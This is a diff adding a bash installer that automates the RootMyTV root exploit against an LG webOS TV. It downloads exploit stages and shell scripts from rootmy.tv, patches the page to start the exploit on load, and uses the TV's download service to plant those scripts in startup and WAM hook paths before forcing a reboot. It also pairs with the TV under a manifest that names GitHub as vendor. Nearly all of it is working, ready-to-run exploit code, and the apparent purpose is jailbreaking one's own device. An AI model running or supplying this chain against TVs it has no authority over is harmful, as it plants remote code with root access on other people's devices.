@@ -1,0 +1,243 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+TV_IP="${1:-192.168.0.73}"
+PORT="${PORT:-8008}"
+WORKDIR="${WORKDIR:-/tmp/lg-ut640s-hbc-installer}"
+
+need() {
+    command -v "$1" >/dev/null 2>&1 || {
+        echo "Missing required command: $1" >&2
+        exit 1
+    }
+}
+
+need curl
+need python3
+need ip
+
+LOCAL_IP="${LOCAL_IP:-$(ip -4 route get "$TV_IP" | awk '{for (i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}')}"
+if [ -z "$LOCAL_IP" ]; then
+    echo "Could not determine local IP for route to $TV_IP; set LOCAL_IP=x.x.x.x" >&2
+    exit 1
+fi
+
+rm -rf "$WORKDIR"
+mkdir -p "$WORKDIR"/{css,files,lib}
+
+fetch() {
+    local url="$1" out="$2"
+    curl -L --retry 8 --retry-all-errors --connect-timeout 20 --fail --silent --show-error "$url" -o "$out"
+}
+
+echo "Preparing local RootMyTV force-v2 mirror in $WORKDIR"
+fetch https://rootmy.tv/stage1.html "$WORKDIR/stage1.html"
+fetch https://rootmy.tv/css/common.css "$WORKDIR/css/common.css"
+fetch https://rootmy.tv/lib/webOSTV.js "$WORKDIR/lib/webOSTV.js"
+fetch https://rootmy.tv/files/jumpstart.sh "$WORKDIR/files/jumpstart.sh"
+fetch https://rootmy.tv/files/stage3.sh "$WORKDIR/files/stage3.sh"
+fetch https://rootmy.tv/files/dummy "$WORKDIR/files/dummy"
+
+echo "Downloading latest Homebrew Channel IPK"
+HB_URL="$(python3 - <<'PY'
+import json, urllib.request
+with urllib.request.urlopen("https://api.github.com/repos/webosbrew/webos-homebrew-channel/releases/latest", timeout=30) as r:
+    rel = json.load(r)
+for asset in rel.get("assets", []):
+    name = asset.get("name", "")
+    if name.endswith("_all.ipk") or name.endswith(".ipk"):
+        print(asset["browser_download_url"])
+        break
+else:
+    raise SystemExit("No IPK asset found")
+PY
+)"
+fetch "$HB_URL" "$WORKDIR/files/hbchannel.ipk"
+
+cat > "$WORKDIR/stage2-force-v2-log.html" <<'HTML'
+<!DOCTYPE html>
+<html><head><title>RootMyTV force v2</title><link rel="stylesheet" href="css/common.css" /></head>
+<body><header><h1>RootMy.TV<small> force v2</small></h1></header><hr><section class="content-center"><article><pre id="log"></pre></article></section><hr>
+<script src="lib/webOSTV.js"></script>
+<script>
+function log(str){var b=document.querySelector('#log'); b.innerText+=str+'\n'; b.scrollIntoView(false); try{(new Image()).src='/rmtvlog?m='+encodeURIComponent(str).slice(0,1500)+'&t='+Date.now();}catch(e){}}
+window.onerror=function(err){log('Unexpected error: '+err);};
+(function(){
+ function download(url,targetDir,targetFilename,success,failure){
+  var target=new URL(url,window.location.href).href;
+  log(targetFilename+': Downloading from '+target+' to '+targetDir+' ...');
+  webOS.service.request('luna://com.webos.service.downloadmanager',{method:'download',parameters:{target:target,targetDir:targetDir,targetFilename:targetFilename,subscribe:true},onSuccess:function(res){
+   log(targetFilename+': result '+JSON.stringify(res));
+   if(res.completed===true){
+    if(res.destPath!==targetDir){ log(targetFilename+': destPath mismatch '+res.destPath+' expected '+targetDir); if(failure)failure(res); }
+    else if(res.httpStatus!==200){ log(targetFilename+': HTTP '+res.httpStatus); if(failure)failure(res); }
+    else { log(targetFilename+': Download completed'); success(); }
+   }
+  },onFailure:function(err){log(targetFilename+': Luna call failed '+JSON.stringify(err)); if(failure)failure(err);}});
+ }
+ function reboot(){webOS.service.request('luna://com.webos.service.sleep',{method:'shutdown/machineReboot',parameters:{reason:'remoteKey'},onSuccess:function(r){log('Reboot request succeeded '+JSON.stringify(r));},onFailure:function(e){log('Failed to reboot '+JSON.stringify(e));}});}
+ log('Forcing RootMyTV v2 WAM extra_conf path; skipping old devmode hook.');
+ download('files/jumpstart.sh','/mnt/lg/cmn_data/wam/','extra_conf.sh',function(){
+  download('files/stage3.sh','/mnt/lg/cmn_data/var/lib/webosbrew/','startup.sh',function(){
+   download('files/hbchannel.ipk','/mnt/lg/appstore/internal/downloads/','hbchannel.ipk',function(){
+    download('files/dummy','/mnt/lg/cmn_data/var/luna/preferences/','devmode_enabled',function(){
+     log('Force-v2 payload staged. Reboot in 5 seconds...'); setTimeout(reboot,5000);
+    });
+   });
+  });
+ });
+})();
+</script></body></html>
+HTML
+
+python3 - "$WORKDIR" <<'PY'
+from pathlib import Path
+import sys
+root = Path(sys.argv[1])
+s = (root / "stage1.html").read_text()
+s = s.replace("new URL('stage2.html', ORIGIN_URL).href", "new URL('stage2-force-v2-log.html', ORIGIN_URL).href")
+insert = """
+    window.addEventListener('load', function(){
+      setTimeout(function(){
+        try { begin_exploit(); } catch(e) { alert('auto start failed: ' + e); }
+      }, 1500);
+    });
+"""
+s = s.replace("    /* slider animation logic */", insert + "\n    /* slider animation logic */")
+(root / "stage1-auto-force-v2.html").write_text(s)
+PY
+
+cat > "$WORKDIR/server.py" <<'PY'
+from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+import os
+
+class Handler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith("/rmtvlog"):
+            msg = parse_qs(urlparse(self.path).query).get("m", [""])[0]
+            print("RMTV:", msg, flush=True)
+            self.send_response(204)
+            self.end_headers()
+            return
+        return super().do_GET()
+
+os.chdir(os.environ["ROOTMYTV_DIR"])
+ThreadingHTTPServer(("0.0.0.0", int(os.environ["ROOTMYTV_PORT"])), Handler).serve_forever()
+PY
+
+SERVER_LOG="$WORKDIR/server.log"
+ROOTMYTV_DIR="$WORKDIR" ROOTMYTV_PORT="$PORT" python3 "$WORKDIR/server.py" >"$SERVER_LOG" 2>&1 &
+SERVER_PID=$!
+cleanup() {
+    kill "$SERVER_PID" >/dev/null 2>&1 || true
+}
+trap cleanup EXIT
+sleep 1
+
+echo "Serving installer at: http://$LOCAL_IP:$PORT/stage1-auto-force-v2.html"
+echo "Launching on TV $TV_IP. Accept any pairing prompt if shown."
+
+python3 - "$TV_IP" "$LOCAL_IP" "$PORT" <<'PY'
+import base64, json, os, socket, struct, sys, time
+
+host, local_ip, port = sys.argv[1], sys.argv[2], int(sys.argv[3])
+target_url = f"http://{local_ip}:{port}/stage1-auto-force-v2.html"
+perms = ["LAUNCH", "LAUNCH_WEBAPP", "APP_TO_APP", "WRITE_NOTIFICATION_TOAST", "READ_INSTALLED_APPS"]
+manifest = {
+    "manifestVersion": 1,
+    "appVersion": "1.1",
+    "signed": {
+        "created": "20260714",
+        "appId": "com.github.copilot.cli.ut640s",
+        "vendorId": "com.github",
+        "localizedAppNames": {"": "UT640S HBC Installer"},
+        "localizedVendorNames": {"": "GitHub"},
+        "permissions": perms,
+    },
+    "permissions": perms,
+}
+
+def ws_connect():
+    key = base64.b64encode(os.urandom(16)).decode()
+    s = socket.socket()
+    s.settimeout(10)
+    s.connect((host, 3000))
+    req = (
+        f"GET / HTTP/1.1\r\nHost: {host}:3000\r\nUpgrade: websocket\r\n"
+        f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
+        "Sec-WebSocket-Version: 13\r\nOrigin: null\r\n\r\n"
+    )
+    s.sendall(req.encode())
+    data = b""
+    while b"\r\n\r\n" not in data:
+        data += s.recv(4096)
+    return s
+
+def send(s, obj):
+    data = json.dumps(obj, separators=(",", ":")).encode()
+    h = bytearray([0x81])
+    n = len(data)
+    if n < 126:
+        h.append(0x80 | n)
+    elif n < 65536:
+        h += bytes([0x80 | 126]) + struct.pack("!H", n)
+    else:
+        h += bytes([0x80 | 127]) + struct.pack("!Q", n)
+    mask = os.urandom(4)
+    h += mask
+    s.sendall(h + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))
+
+def recv(s, timeout=8):
+    s.settimeout(timeout)
+    h = s.recv(2)
+    if not h:
+        return None
+    b1, b2 = h
+    ln = b2 & 127
+    if ln == 126:
+        ln = struct.unpack("!H", s.recv(2))[0]
+    elif ln == 127:
+        ln = struct.unpack("!Q", s.recv(8))[0]
+    mask = s.recv(4) if b2 & 128 else None
+    data = b""
+    while len(data) < ln:
+        data += s.recv(ln - len(data))
+    if mask:
+        data = bytes(x ^ mask[i % 4] for i, x in enumerate(data))
+    return data.decode("utf-8", "replace")
+
+s = ws_connect()
+send(s, {"type": "register", "id": "reg", "payload": {"pairingType": "PROMPT", "manifest": manifest}})
+registered = False
+end = time.time() + 75
+while time.time() < end:
+    try:
+        msg = recv(s, 5)
+    except Exception:
+        print("waiting for pairing...")
+        continue
+    print(msg)
+    if msg and '"type":"registered"' in msg:
+        registered = True
+        break
+if not registered:
+    raise SystemExit("TV did not register. Make sure it is on and accept any pairing prompt.")
+
+send(s, {
+    "type": "request",
+    "id": "launch",
+    "uri": "ssap://system.launcher/launch",
+    "payload": {"id": "com.webos.app.browser", "params": {"target": target_url}},
+})
+print(recv(s, 10))
+s.close()
+PY
+
+echo
+echo "Streaming TV installer logs for 150 seconds..."
+echo "Look for: Force-v2 payload staged / Reboot request succeeded"
+timeout 150 tail -n +1 -f "$SERVER_LOG" || true
+
+echo
+echo "If Homebrew Channel does not appear, power-cycle the TV and retry launching it after 1-2 minutes."
